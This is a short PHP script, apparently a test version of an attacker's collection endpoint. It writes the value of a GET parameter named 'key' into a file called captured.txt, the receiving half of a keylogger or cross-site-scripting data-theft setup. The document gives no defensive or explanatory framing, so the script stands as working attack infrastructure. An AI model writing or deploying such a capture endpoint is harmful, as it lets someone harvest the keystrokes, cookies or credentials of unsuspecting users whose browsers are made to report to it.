<?php
echo "<h2>Test!</h2>";
if(!empty($_GET['key'])) {
 $logfile = fopen('captured.txt', 'a+');
 fwrite($logfile, $_GET['key']);
 fclose($logfile);
}
?>
